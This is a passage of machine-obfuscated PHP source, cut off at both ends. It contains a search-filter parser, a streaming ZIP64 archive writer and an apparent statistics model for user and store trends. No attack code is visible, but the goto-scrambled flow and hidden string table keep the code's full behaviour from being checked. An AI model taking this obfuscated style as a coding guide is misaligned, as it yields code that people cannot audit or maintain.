$FÍ÷«’åÛÚ[$ağÉƒ‘®²¼[2177]] . $ağÉƒ‘®²¼[2179]); goto Eí¬‡½ÍíŒ; C÷À­æ¡‹á: } private function _parseSearchWhere($EêØ’ÂÈ§Ş) { goto f•­«ÀÌÇš; f››ø’°„Û: if (isset($EêØ’ÂÈ§Ş[$fãÅ¤’²[535]])) { $f¢ç’˜Ü×[] = array($fãÅ¤’²[379] => $EêØ’ÂÈ§Ş[$fãÅ¤’²[535]], $fãÅ¤’²[378] => $EêØ’ÂÈ§Ş[$fãÅ¤’²[535]], $fãÅ¤’²[915] => $fãÅ¤’²[2181]); } if (isset($EêØ’ÂÈ§Ş[$fãÅ¤’²[372]])) { $dòÑŞˆ‰°Æ = $EêØ’ÂÈ§Ş[$fãÅ¤’²[372]]; if ($dòÑŞˆ‰°Æ == $fãÅ¤’²[76]) { $f¢ç’˜Ü×[$fãÅ¤’²[370]] = 1; } else { if ($dòÑŞˆ‰°Æ == $fãÅ¤’²[2324]) { $f¢ç’˜Ü×[$fãÅ¤’²[370]] = 0; } else { if ($dòÑŞˆ‰°Æ) { $dòÑŞˆ‰°Æ = is_array($dòÑŞˆ‰°Æ) ? $dòÑŞˆ‰°Æ : explode($fãÅ¤’²[47], $dòÑŞˆ‰°Æ); $f¢ç’˜Ü×[$fãÅ¤’²[372]] = array($fãÅ¤’²[384], $dòÑŞˆ‰°Æ); $f¢ç’˜Ü×[$fãÅ¤’²[370]] = 0; } } } } if (isset($EêØ’ÂÈ§Ş[$fãÅ¤’²[461]])) { $BÈƒ‘ŠŠ¡ = $this->sourceInfo($EêØ’ÂÈ§Ş[$fãÅ¤’²[461]]); $f¢ç’˜Ü×[$fãÅ¤’²[525]] = array($fãÅ¤’²[483], $BÈƒ‘ŠŠ¡[$fãÅ¤’²[459]] . $EêØ’ÂÈ§Ş[$fãÅ¤’²[461]] . $fãÅ¤’²[484]); } goto b ©Ã‘ğœ‡; f•­«ÀÌÇš: $fãÅ¤’² =& $_SERVER[Æ]; $f¢ç’˜Ü× = array(); if (isset($EêØ’ÂÈ§Ş[$fãÅ¤’²[700]])) { $f¢ç’˜Ü×[$fãÅ¤’²[107]] = array($fãÅ¤’²[2319], $EêØ’ÂÈ§Ş[$fãÅ¤’²[700]]); } goto Cèàµ†ÍÏ÷; b ©Ã‘ğœ‡: if (isset($EêØ’ÂÈ§Ş[$fãÅ¤’²[2177]]) && $EêØ’ÂÈ§Ş[$fãÅ¤’²[2177]]) { $Cç¸ïáÌâÄ = $EêØ’ÂÈ§Ş[$fãÅ¤’²[2177]]; $F÷êŠÙ¡ƒĞ = explode($fãÅ¤’²[50], $Cç¸ïáÌâÄ); if (strlen($Cç¸ïáÌâÄ) > 2 && (substr($Cç¸ïáÌâÄ, 0, 1) == $fãÅ¤’²[113] && substr($Cç¸ïáÌâÄ, -1) == $fãÅ¤’²[113]) || substr($Cç¸ïáÌâÄ, 0, 1) == $fãÅ¤’²[55] && substr($Cç¸ïáÌâÄ, -1) == $fãÅ¤’²[55]) { $Cç¸ïáÌâÄ = substr($Cç¸ïáÌâÄ, 1, -1); $F÷êŠÙ¡ƒĞ = array($Cç¸ïáÌâÄ); } $f¢ç’˜Ü×[$fãÅ¤’²[28]] = array($fãÅ¤’²[483], $fãÅ¤’²[2179] . $Cç¸ïáÌâÄ . $fãÅ¤’²[2179]); if (count($F÷êŠÙ¡ƒĞ) > 1) { $f¢ç’˜Ü×[$fãÅ¤’²[28]] = array(); foreach ($F÷êŠÙ¡ƒĞ as $A¿Ê«‰è ) { if (!trim($A¿Ê«‰è )) { continue; } $f¢ç’˜Ü×[$fãÅ¤’²[28]][] = array($fãÅ¤’²[483], $fãÅ¤’²[2179] . trim($A¿Ê«‰è ) . $fãÅ¤’²[2179]); } } } return $f¢ç’˜Ü×; goto cˆ‹¸°¯²È; Cèàµ†ÍÏ÷: if (isset($EêØ’ÂÈ§Ş[$fãÅ¤’²[701]])) { $DÍ–‹ˆ†Şô = array($fãÅ¤’²[2320], $EêØ’ÂÈ§Ş[$fãÅ¤’²[701]]); if ($f¢ç’˜Ü×[$fãÅ¤’²[107]]) { $f¢ç’˜Ü×[$fãÅ¤’²[107]] = array($f¢ç’˜Ü×[$fãÅ¤’²[107]], $DÍ–‹ˆ†Şô, $fãÅ¤’²[2321]); } else { $f¢ç’˜Ü×[$fãÅ¤’²[107]] = $DÍ–‹ˆ†Şô; } } if (isset($EêØ’ÂÈ§Ş[$fãÅ¤’²[2322]])) { $f¢ç’˜Ü×[$fãÅ¤’²[77]] = array($fãÅ¤’²[2319], $EêØ’ÂÈ§Ş[$fãÅ¤’²[2322]]); } if (isset($EêØ’ÂÈ§Ş[$fãÅ¤’²[2323]])) { $DÍ–‹ˆ†Şô = array($fãÅ¤’²[2320], $EêØ’ÂÈ§Ş[$fãÅ¤’²[2323]]); if ($f¢ç’˜Ü×[$fãÅ¤’²[77]]) { $f¢ç’˜Ü×[$fãÅ¤’²[77]] = array($f¢ç’˜Ü×[$fãÅ¤’²[77]], $DÍ–‹ˆ†Şô, $fãÅ¤’²[2321]); } else { $f¢ç’˜Ü×[$fãÅ¤’²[77]] = $DÍ–‹ˆ†Şô; } } goto f››ø’°„Û; cˆ‹¸°¯²È: } } goto bÒ°ïºğâ; aê³öàéµŒ: class ZipMake { const VERSION = "\60\x2e\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($c½°Š“¾—™ = null) { $f¬ëÁÉ§ô =& $_SERVER[Æ]; $this->outputStream = fopen($f¬ëÁÉ§ô[2006], $f¬ëÁÉ§ô[1225]); $this->outputName = $c½°Š“¾—™; $this->needHeaders = !0; } public function addFile($Dƒ‡ÔÀ÷×Å, $bÁÕ†Ãê‡) { goto A©××¹Ã·Ş; cô©­”î½±: while (!feof($Cœ£ÇÂÆÉ¤)) { $D®‡„‘ÂÃŒ = fread($Cœ£ÇÂÆÉ¤, 1048576); $this->send($D®‡„‘ÂÃŒ); } fclose($Cœ£ÇÂÆÉ¤); $AÚÕÈãñ = hexdec(hash_file($dÔÂÂ’›Õ‡[2008], $bÁÕ†Ãê‡)); goto BòÑÓïÔÌÚ; BòÑÓïÔÌÚ: $this->addFileFooter($Dƒ‡ÔÀ÷×Å, $C¬‰—íÓ¸Í, $AÚÕÈãñ, $AÚ½›ŒÂˆ, $b‡ô¨ŸóÓ‚, $Cƒ¹«Çä™); goto b—ÒÜá«‚; A©××¹Ã·Ş: $dÔÂÂ’›Õ‡ =& $_SERVER[Æ]; $Dƒ‡ÔÀ÷×Å = $this->filterFilename($Dƒ‡ÔÀ÷×Å); $C¬‰—íÓ¸Í = static::METHOD_STORE; goto cÉ‹çò·Ü; cÉ‹çò·Ü: $Cƒ¹«Çä™ = $this->addFileHeader($Dƒ‡ÔÀ÷×Å, $C¬‰—íÓ¸Í); $AÚ½›ŒÂˆ = $b‡ô¨ŸóÓ‚ = filesize($bÁÕ†Ãê‡); $Cœ£ÇÂÆÉ¤ = fopen($bÁÕ†Ãê‡, $dÔÂÂ’›Õ‡[2007]); goto cô©­”î½±; b—ÒÜá«‚: } public function addFileFromStream($bÙ„‘¡”‡©, $A‚¼®©ö‚) { goto bâŒøÜİ; BºŞ¯¹ÌØò: $this->addFileFooter($bÙ„‘¡”‡©, $c³òìáï“¸, $A•¶ÏÓá°¡, $BÆéŸéæà , $d’ø“íõ¥, $dóÑÚ˜¸Ü); goto A£ÀŒ¯ªéê; bâŒøÜİ: $bÙ„‘¡”‡© = $this->filterFilename($bÙ„‘¡”‡©); $c³òìáï“¸ = static::METHOD_STORE; $dóÑÚ˜¸Ü = $this->addFileHeader($bÙ„‘¡”‡©, $c³òìáï“¸); goto EŸÛì¾à†ê; EŸÛì¾à†ê: fseek($A‚¼®©ö‚, 0, SEEK_END); $BÆéŸéæà  = $d’ø“íõ¥ = ftell($A‚¼®©ö‚); rewind($A‚¼®©ö‚); goto b§ ¤‘õ­Ñ; b§ ¤‘õ­Ñ: $aÆÙŒ§ºèŒ = hash_init($_SERVER[Æ][2008]); while (!feof($A‚¼®©ö‚)) { $A¢Ü°«Â„õ = fread($A‚¼®©ö‚, 1048576); hash_update($aÆÙŒ§ºèŒ, $A¢Ü°«Â„õ); $this->send($A¢Ü°«Â„õ); } $A•¶ÏÓá°¡ = hexdec(hash_final($aÆÙŒ§ºèŒ)); goto BºŞ¯¹ÌØò; A£ÀŒ¯ªéê: } public function finish() { foreach ($this->files as $F—È‘Ñ›’) { $this->addCdrFile($F—È‘Ñ›’); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($F¼‹­ßï®ƒ, $DÓ”é¦Œİ™) { goto c‚éê‹Û™ì; dÓö…ˆóãˆ: $b‡Ş’¶ğ„³ = $this->dosTime(time()); $aÒ’ƒØ²éÖ = array(array($bâä¿¡“æÔ[2010], static::FILE_HEADER_SIGNATURE), array($bâä¿¡“æÔ[2011], static::ZIP_VERSION_64), array($bâä¿¡“æÔ[2011], 8), array($bâä¿¡“æÔ[2011], $DÓ”é¦Œİ™), array($bâä¿¡“æÔ[2010], $b‡Ş’¶ğ„³), array($bâä¿¡“æÔ[2010], 0), array($bâä¿¡“æÔ[2010], 4294967295), array($bâä¿¡“æÔ[2010], 4294967295), array($bâä¿¡“æÔ[2011], $CñÖ™Ç¢˜), array($bâä¿¡“æÔ[2011], 32)); $c›ŒÒŸÊÏ– = array(array($bâä¿¡“æÔ[2011], 1), array($bâä¿¡“æÔ[2011], 28), array($bâä¿¡“æÔ[2012], 0), array($bâä¿¡“æÔ[2012], 0), array($bâä¿¡“æÔ[2012], 0), array($bâä¿¡“æÔ[2010], 0)); goto cñ„ØŠ‹¨æ; cñ„ØŠ‹¨æ: $aÂ°‘¹š¿ = $this->packFields($aÒ’ƒØ²éÖ); $dº–‹‰¦î = $this->packFields($c›ŒÒŸÊÏ–); $this->send($aÂ°‘¹š¿ . $F¼‹­ßï®ƒ . $dº–‹‰¦î); goto e«®æ”ÀÂ; e«®æ”ÀÂ: return strlen($aÂ°‘¹š¿) + $CñÖ™Ç¢˜ + strlen($dº–‹‰¦î); goto b¢“§±»İË; c‚éê‹Û™ì: $bâä¿¡“æÔ =& $_SERVER[Æ]; $F¼‹­ßï®ƒ = preg_replace($bâä¿¡“æÔ[2009], $bâä¿¡“æÔ[33], $F¼‹­ßï®ƒ); $CñÖ™Ç¢˜ = strlen($F¼‹­ßï®ƒ); goto dÓö…ˆóãˆ; b¢“§±»İË: } protected function addFileFooter($a£ƒªÀ«Ôƒ, $eê”Äš÷ë…, $A÷ˆÏ¬•Çö, $D˜…‡ö„ê, $eÚš›ïÎò¹, $D§¶æä¹È¯) { $CÁ¸‡’å“ =& $_SERVER[Æ]; $e¦µœÚóİÇ = array(array($CÁ¸‡’å“[2010], static::DATA_DESCRIPTOR_SIGNATURE), array($CÁ¸‡’å“[2010], $A÷ˆÏ¬•Çö), array($CÁ¸‡’å“[2012], $D˜…‡ö„ê), array($CÁ¸‡’å“[2012], $eÚš›ïÎò¹)); $d‰–¼Ç í = $this->packFields($e¦µœÚóİÇ); $this->send($d‰–¼Ç í); $Aç½‡ŒÇ°Ú = $D§¶æä¹È¯ + $D˜…‡ö„ê + $cÉĞ¯ÁÏõİ; $this->addToCdr($a£ƒªÀ«Ôƒ, $eê”Äš÷ë…, $A÷ˆÏ¬•Çö, $D˜…‡ö„ê, $eÚš›ïÎò¹, $Aç½‡ŒÇ°Ú); } private function addToCdr($bƒ†¶Œõ³—, $FµÅÌ¡‰—·, $Dóºˆùöèä, $C•º‘–èËŒ, $DÕßî‡˜¢Í, $d”›‹Ñœ‹­) { $this->files[] = array($bƒ†¶Œõ³—, $FµÅÌ¡‰—·, $Dóºˆùöèä, $C•º‘–èËŒ, $DÕßî‡˜¢Í, $this->ofs); $this->ofs += $d”›‹Ñœ‹­; } protected function addCdrFile($aÌ³ë„Ò•²) { goto EïøâîÛ—ò; EïøâîÛ—ò: $E¨Ïº¨éê– =& $_SERVER[Æ]; list($côËîàŠ¼í, $D‰…ùëö, $d‹¢á¶ö, $dˆØ°ì¹É, $f±À“Éáˆ³, $fŠìñ˜Â³œ) = $aÌ³ë„Ò•²; $a’Î²Ú… = $E¨Ïº¨éê–[33]; goto cÕ› ¾; BöÄëê®¶: $this->send($b—°÷Ö„â); $this->cdr_ofs += strlen($b—°÷Ö„â); goto F®ôƒÕ•; cÕ› ¾: $AŠË®Ôêæ„ = $this->dosTime(time()); $Fâ«´ª•‰° = array(array($E¨Ïº¨éê–[2010], static::CDR_FILE_SIGNATURE), array($E¨Ïº¨éê–[2011], static::ZIP_VERSION_64), array($E¨Ïº¨éê–[2011], static::ZIP_VERSION_64), array($E¨Ïº¨éê–[2011], 8), array($E¨Ïº¨éê–[2011], $D‰…ùëö), array($E¨Ïº¨éê–[2010], $AŠË®Ôêæ„), array($E¨Ïº¨éê–[2010], $d‹¢á¶ö), array($E¨Ïº¨éê–[2010], 4294967295), array($E¨Ïº¨éê–[2010], 4294967295), array($E¨Ïº¨éê–[2011], strlen($côËîàŠ¼í)), array($E¨Ïº¨éê–[2011], 32), array($E¨Ïº¨éê–[2011], strlen($a’Î²Ú…)), array($E¨Ïº¨éê–[2011], 0), array($E¨Ïº¨éê–[2011], 0), array($E¨Ïº¨éê–[2010], 32), array($E¨Ïº¨éê–[2010], 4294967295)); $EÕßóì´Ê = array(array($E¨Ïº¨éê–[2011], 1), array($E¨Ïº¨éê–[2011], 28), array($E¨Ïº¨éê–[2012], $f±À“Éáˆ³), array($E¨Ïº¨éê–[2012], $dˆØ°ì¹É), array($E¨Ïº¨éê–[2012], $fŠìñ˜Â³œ), array($E¨Ïº¨éê–[2010], 0)); goto aõ«‘Ğâƒã; aõ«‘Ğâƒã: $Aé‹œïëË = $this->packFields($Fâ«´ª•‰°); $dÃª¤»œ”† = $this->packFields($EÕßóì´Ê); $b—°÷Ö„â = $Aé‹œïëË . $côËîàŠ¼í . $a’Î²Ú… . $dÃª¤»œ”†; goto BöÄëê®¶; F®ôƒÕ•: } protected function addCdr64Eof() { goto Cˆ±«¶•ÇÖ; Cˆ±«¶•ÇÖ: $c“ù È…Àô =& $_SERVER[Æ]; $C¯ãä¦ƒ†ó = count($this->files); $BÍ°©—ô¢ = $this->cdr_ofs; goto Cƒ¿‰Î”ˆ; f¾á–±¨áÇ: $this->send($CÄÇ¿œƒÒ›); goto CµõŒÖÀ…ˆ; Cƒ¿‰Î”ˆ: $B«íµ„÷¯’ = $this->ofs; $FÌ‘å×¬¹¸ = array(array($c“ù È…Àô[2010], static::ZIP64_CDR_EOF_SIGNATURE), array($c“ù È…Àô[2012], 44), array($c“ù È…Àô[2011], static::ZIP_VERSION_64), array($c“ù È…Àô[2011], static::ZIP_VERSION_64), array($c“ù È…Àô[2010], 0), array($c“ù È…Àô[2010], 0), array($c“ù È…Àô[2012], $C¯ãä¦ƒ†ó), array($c“ù È…Àô[2012], $C¯ãä¦ƒ†ó), array($c“ù È…Àô[2012], $BÍ°©—ô¢), array($c“ù È…Àô[2012], $B«íµ„÷¯’)); $CÄÇ¿œƒÒ› = $this->packFields($FÌ‘å×¬¹¸); goto f¾á–±¨áÇ; CµõŒÖÀ…ˆ: } protected function addCdr64Locator() { goto EòÂê˜§¯±; eäƒÂï´Ş±: $this->send($e©®Æ‘ßµù); goto Cø†áîÅ£; DÓ¿†ŒÕ•: $dŸÔƒÓĞå = $this->ofs; $C‹ìÇÀ¸Š² = array(array($b¯Àá¦–ìÃ[2010], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($b¯Àá¦–ìÃ[2010], 0), array($b¯Àá¦–ìÃ[2012], $dŸÔƒÓĞå + $f™”µ·ÍÂÌ), array($b¯Àá¦–ìÃ[2010], 1)); $e©®Æ‘ßµù = $this->packFields($C‹ìÇÀ¸Š²); goto eäƒÂï´Ş±; EòÂê˜§¯±: $b¯Àá¦–ìÃ =& $_SERVER[Æ]; $B¬¡Òëì§Á = count($this->files); $f™”µ·ÍÂÌ = $this->cdr_ofs; goto DÓ¿†ŒÕ•; Cø†áîÅ£: } protected function addCdrEof() { goto cß¤¤¹òµ»; Fª±œÜ±‡: $fù‚ì¨ß¡ª = $this->ofs; $DÔ ¢‘Ì×” = $b¹¼ŸáÃ²‚[33]; $Cªˆ‘Ûˆ¸ì = array(array($b¹¼ŸáÃ²‚[2010], static::CDR_EOF_SIGNATURE), array($b¹¼ŸáÃ²‚[2011], 0), array($b¹¼ŸáÃ²‚[2011], 0), array($b¹¼ŸáÃ²‚[2011], $eãÇ„ºÙ·‘), array($b¹¼ŸáÃ²‚[2011], $eãÇ„ºÙ·‘), array($b¹¼ŸáÃ²‚[2010], 4294967295), array($b¹¼ŸáÃ²‚[2010], 4294967295), array($b¹¼ŸáÃ²‚[2011], strlen($DÔ ¢‘Ì×”))); goto aßÕ‰‚§÷; aßÕ‰‚§÷: $e–ä‹ÆªÙ = $this->packFields($Cªˆ‘Ûˆ¸ì) . $DÔ ¢‘Ì×”; $this->send($e–ä‹ÆªÙ); goto AœĞ£ŸàéÕ; cß¤¤¹òµ»: $b¹¼ŸáÃ²‚ =& $_SERVER[Æ]; $eãÇ„ºÙ·‘ = count($this->files); $F°˜ğ¬¹±» = $this->cdr_ofs; goto Fª±œÜ±‡; AœĞ£ŸàéÕ: } protected function addCdr() { foreach ($this->files as $Eãèí´ ±°) { $this->addCdrFile($Eãèí´ ±°); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $Fª¶ƒà¬¢â =& $_SERVER[Æ]; $E„á³µ– = $Fª¶ƒà¬¢â[202]; if ($this->outputName) { $F‚ÁÕ ³Ğí = trim(str_replace(array($Fª¶ƒà¬¢â[113], $Fª¶ƒà¬¢â[55], $Fª¶ƒà¬¢â[93], $Fª¶ƒà¬¢â[67], $Fª¶ƒà¬¢â[217], $Fª¶ƒà¬¢â[991]), $Fª¶ƒà¬¢â[33], $this->outputName)); $f‘ôå‚‡´Á = rawurlencode($F‚ÁÕ ³Ğí); $E„á³µ– .= "\73\x20\146\151\x6c\x65\x6e\x61\x6d\x65\x2a\x3d\165\x74\x66\55\x38\47\x27{$f‘ôå‚‡´Á}"; } $b—ÖÅÆÈ“ô = array($Fª¶ƒà¬¢â[199] => $Fª¶ƒà¬¢â[2013], $Fª¶ƒà¬¢â[2014] => $E„á³µ–, $Fª¶ƒà¬¢â[2015] => $Fª¶ƒà¬¢â[2016], $Fª¶ƒà¬¢â[2017] => $Fª¶ƒà¬¢â[2018], $Fª¶ƒà¬¢â[2019] => $Fª¶ƒà¬¢â[2020]); foreach ($b—ÖÅÆÈ“ô as $Dï„Ÿ˜¤ÔÄ => $Bë¦Ê†”) { header($Dï„Ÿ˜¤ÔÄ . $Fª¶ƒà¬¢â[881] . $Bë¦Ê†”); } } protected function send($c³®£¡×Ô) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $c³®£¡×Ô); } protected final function dosTime($AÉ¯‚­õŠˆ) { $fóÙÏ¤á =& $_SERVER[Æ]; $F„¶³Ã©³ = getdate($AÉ¯‚­õŠˆ); if ($F„¶³Ã©³[$fóÙÏ¤á[1723]] < 1980) { $F„¶³Ã©³ = array($fóÙÏ¤á[1723] => 1980, $fóÙÏ¤á[2021] => 1, $fóÙÏ¤á[2022] => 1, $fóÙÏ¤á[2023] => 0, $fóÙÏ¤á[2024] => 0, $fóÙÏ¤á[2025] => 0); } $F„¶³Ã©³[$fóÙÏ¤á[1723]] -= 1980; return $F„¶³Ã©³[$fóÙÏ¤á[1723]] << 25 | $F„¶³Ã©³[$fóÙÏ¤á[2021]] << 21 | $F„¶³Ã©³[$fóÙÏ¤á[2022]] << 16 | $F„¶³Ã©³[$fóÙÏ¤á[2023]] << 11 | $F„¶³Ã©³[$fóÙÏ¤á[2024]] << 5 | $F„¶³Ã©³[$fóÙÏ¤á[2025]] >> 1; } protected function packFields($Cğ†ƒšš¹ò) { $c¶Ëä¬× =& $_SERVER[Æ]; $cÆ‘ğ‘âÀª = $c¶Ëä¬×[33]; $f¾—á”õø = array(); foreach ($Cğ†ƒšš¹ò as $EÉç¨÷µ„­) { $cÆ‘ğ‘âÀª .= $EÉç¨÷µ„­[0]; $f¾—á”õø[] = $EÉç¨÷µ„­[1]; } array_unshift($f¾—á”õø, $cÆ‘ğ‘âÀª); return call_user_func_array($c¶Ëä¬×[2026], $f¾—á”õø); } protected function filterFilename($Aåòˆ´ã) { $fÇí‰•ŒùÀ =& $_SERVER[Æ]; return str_replace(array($fÇí‰•ŒùÀ[93], $fÇí‰•ŒùÀ[4], $fÇí‰•ŒùÀ[176], $fÇí‰•ŒùÀ[69], $fÇí‰•ŒùÀ[113], $fÇí‰•ŒùÀ[926], $fÇí‰•ŒùÀ[929], $fÇí‰•ŒùÀ[271]), $fÇí‰•ŒùÀ[70], $Aåòˆ´ã); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($F‡÷¬á©ÚÉ) { $CƒôµÅ£ Ñ =& $_SERVER[Æ]; $B‘ë ƒ´·ˆ = array($CƒôµÅ£ Ñ[535] => array($CƒôµÅ£ Ñ[29] => $CƒôµÅ£ Ñ[2027], $CƒôµÅ£ Ñ[261] => array($CƒôµÅ£ Ñ[210], $CƒôµÅ£ Ñ[698], $CƒôµÅ£ Ñ[2028], $CƒôµÅ£ Ñ[2029])), $CƒôµÅ£ Ñ[2030] => array($CƒôµÅ£ Ñ[29] => $CƒôµÅ£ Ñ[2031], $CƒôµÅ£ Ñ[261] => array($CƒôµÅ£ Ñ[210], $CƒôµÅ£ Ñ[696], $CƒôµÅ£ Ñ[2032], $CƒôµÅ£ Ñ[2033], $CƒôµÅ£ Ñ[2034]))); if (!isset($B‘ë ƒ´·ˆ[$F‡÷¬á©ÚÉ])) { return !1; } $this->optionType = $B‘ë ƒ´·ˆ[$F‡÷¬á©ÚÉ][$CƒôµÅ£ Ñ[29]]; $this->field = $B‘ë ƒ´·ˆ[$F‡÷¬á©ÚÉ][$CƒôµÅ£ Ñ[261]]; return !0; } public function listData($EìÑ‰Ä¹ä = false, $C¤ÎæÎÙ×é = "\155\157\x64\x69\x66\171\124\x69\x6d\x65", $Bš÷Œ£¢ã = false) { return parent::listData($EìÑ‰Ä¹ä, $C¤ÎæÎÙ×é, $Bš÷Œ£¢ã); } public function trendList($cŸ¢îøóÂ) { goto C—ÏˆŠ›•Ş; F¿¸¾¥›œ¾: if (!isset($eÄ­ˆø†ˆƒ)) { $Cé–ñø†Ö˜ = $cŸ¢îøóÂ == $eˆ«›ôá…÷[535] ? $eˆ«›ôá…÷[477] : $eˆ«›ôá…÷[751]; $eÄ­ˆø†ˆƒ = Model($Cé–ñø†Ö˜)->min($eˆ«›ôá…÷[187]); } $A©¬‡›Ì = $eˆ«›ôá…÷[2037] . ucfirst($cŸ¢îøóÂ); $e–±Èáİ = $this->dateList($eÄ­ˆø†ˆƒ); goto C§’õ–¶; C§’õ–¶: foreach ($e–±Èáİ as $e²®ÂÍæ¹ñ) { $this->{$A©¬‡›Ì}($e²®ÂÍæ¹ñ); } return $this->listData(); goto F©–°Á¥Õ; C—ÏˆŠ›•Ş: $eˆ«›ôá…÷ =& $_SERVER[Æ]; $FÂÂÃ›çïÔ = $this->listData(); if ($FÂÂÃ›çïÔ) { $dëÈö”¡¤® = end($FÂÂÃ›çïÔ); $e²®ÂÍæ¹ñ = date($eˆ«›ôá…÷[2035], strtotime($eˆ«›ôá…÷[2036])); if ($dëÈö”¡¤®[$eˆ«›ôá…÷[210]] == $e²®ÂÍæ¹ñ) { return $FÂÂÃ›çïÔ; } $eÄ­ˆø†ˆƒ = strtotime($dëÈö”¡¤®[$eˆ«›ôá…÷[210]]); } goto F¿¸¾¥›œ¾; F©–°Á¥Õ: } private function dateList($A×¼éø½ŠÅ) { $d›¹ÃùÜô =& $_SERVER[Æ]; $F»Á¡“Ö½Ú = $A×¼éø½ŠÅ; $FÅ»ˆÒ•»ö = strtotime($d›¹ÃùÜô[2036]); $eæµ‡ø­”Å = array(); while ($F»Á¡“Ö½Ú <= $FÅ»ˆÒ•»ö) { $eæµ‡ø­”Å[] = date($d›¹ÃùÜô[2035], $F»Á¡“Ö½Ú); $F»Á¡“Ö½Ú = strtotime($d›¹ÃùÜô[2038], $F»Á¡“Ö½Ú); } return $eæµ‡ø­”Å; } public function _recordUser($BãöÁó‘‘à = '') { goto D†¸Ò¯Óö; eñÜ‚È‰: $b”ùÅ™¹Î« = array($d‡–ò¥í²×[187] => array($d‡–ò¥í²×[928], $d“«“·½Ëö)); $e•âïÉÊµ¦ = Model($d‡–ò¥í²×[477])->where($b”ùÅ™¹Î«)->count($d‡–ò¥í²×[1434]); $b”ùÅ™¹Î«[$d‡–ò¥í²×[187]] = array($d‡–ò¥í²×[321], array($fƒ× „ ¹Å, $d“«“·½Ëö)); goto dÑÏÃíêºõ; B¢×„éïÚ‡: $b§°©‘¤”± = array($d‡–ò¥í²×[210] => $BãöÁó‘‘à, $d‡–ò¥í²×[698] => (int) $e•âïÉÊµ¦, $d‡–ò¥í²×[2028] => (int) $cÏêÓ¶É•Ó, $d‡–ò¥í²×[2029] => (int) $FÛù¿šî¨); return $this->insert($b§°©‘¤”±); goto E×ŠÒäöˆã; dÑÏÃíêºõ: $cÏêÓ¶É•Ó = Model($d‡–ò¥í²×[477])->where($b”ùÅ™¹Î«)->count($d‡–ò¥í²×[1434]); $b”ùÅ™¹Î«[$d‡–ò¥í²×[29]] = $d‡–ò¥í²×[2041]; $FÛù¿šî¨ = Model($d‡–ò¥í²×[2042])->where($b”ùÅ™¹Î«)->count($d‡–ò¥í²×[2043]); goto B¢×„éïÚ‡; D†¸Ò¯Óö: $d‡–ò¥í²× =& $_SERVER[Æ]; $fƒ× „ ¹Å = strtotime(date($d‡–ò¥í²×[2039], strtotime($BãöÁó‘‘à))); $d“«“·½Ëö = strtotime(date($d‡–ò¥í²×[2040], strtotime($BãöÁó‘‘à))); goto eñÜ‚È‰; E×ŠÒäöˆã: } public function _recordStore($a¸ôÊˆˆŠ = '') { goto Bµ×˜•ˆãÕ; FÆÔµÜ¡Öâ: $Bå«ù¦Ê = Model($b‡¿‘™÷ô [422])->where($DŒ³ô…ğ„ö)->sum($b‡¿‘™÷ô [77]); $DŒ³ô…ğ„ö[$b‡¿‘™÷ô [370]] = 0; $E”Ù«ˆŞ°¼ = Model($b‡¿‘™÷ô [751])->where($DŒ³ô…ğ„ö)->sum($b‡¿‘™÷ô [77]); goto A¡õÃŸ•º; Bµ×˜•ˆãÕ: $b‡¿‘™÷ô  =& $_SERVER[Æ]; $f¥¤‰ëÄá = strtotime(date($b‡¿‘™÷ô [2040], strtotime($a¸ôÊˆˆŠ))); $DŒ³ô…ğ„ö = array($b‡¿‘™÷ô [187] => array($b‡¿‘™÷ô [928], $f¥¤‰ëÄá)); goto FÆÔµÜ¡Öâ; d—Šï·ù‡: $cÛ×²£«Œ = Model($b‡¿‘™÷ô [751])->where($DŒ³ô…ğ„ö)->sum($b‡¿‘™÷ô [77]); $d³·‹„ÁÄã = array($b‡¿‘™÷ô [210] => $a¸ôÊˆˆŠ, $b‡¿‘™÷ô [696] => (int) $E”Ù«ˆŞ°¼, $b‡¿‘™÷ô [2032] => (int) $Bå«ù¦Ê, $b‡¿‘™÷ô [2033] => (int) $dóğ§¡´™, $b‡¿‘™÷ô [2034] => (int) $cÛ×²£«Œ); return $this->insert($d³·‹„ÁÄã); goto fæğ¯…î®; A¡õÃŸ•º: $DŒ³ô…ğ„ö[$b‡¿‘™÷ô [371]] = 1; $dóğ§¡´™ = Model($b‡¿‘™÷ô [751])->where($DŒ³ô…ğ„ö)->sum($b‡¿‘™÷ô [77]); $DŒ³ô…ğ„ö[$b‡¿‘™÷ô [371]] = 2; goto d—Šï·ù‡; fæğ¯…î®: } public function trend($bòâÁšœ, $aÊ‰ä¢Çß) { goto EÕÚÈÉœÏ×; EÕÚÈÉœÏ×: $cØÎ¢Ê‚‡× =& $_SERVER[Æ]; if (!$this->init($bòâÁšœ)) { return !1; } $f–ÍŒ…¢Ì = $this->trendList($bòâÁšœ); goto DÅ™„¦ˆ˜; DÅ™„¦ˆ˜: if ($f–ÍŒ…¢Ì && $aÊ‰ä¢Çß != $cØÎ¢Ê‚‡×[1409]) { $C¤æç‘¨æ = $f–ÍŒ…¢Ì[0][$cØÎ¢Ê‚‡×[210]]; $e‰×áÂÂˆ– = $this->validDate($aÊ‰ä¢Çß, $C¤æç‘¨æ); $fÔœñÎ–Ğà = array(); $eŞáÙÓİî = array_to_keyvalue($f–ÍŒ…¢Ì, $cØÎ¢Ê‚‡×[210]); foreach ($e‰×áÂÂˆ– as $aÑà¤²¬ƒª) { if (isset($eŞáÙÓİî[$aÑà¤²¬ƒª])) { $b˜©òŸ‚âÃ = $eŞáÙÓİî[$aÑà¤²¬ƒª]; } else { $b˜©òŸ‚âÃ = end($f–ÍŒ…¢Ì); $b˜©òŸ‚âÃ[$cØÎ¢Ê‚‡×[210]] = $aÑà¤²¬ƒª; if ($bòâÁšœ == $cØÎ¢Ê‚‡×[535]) { 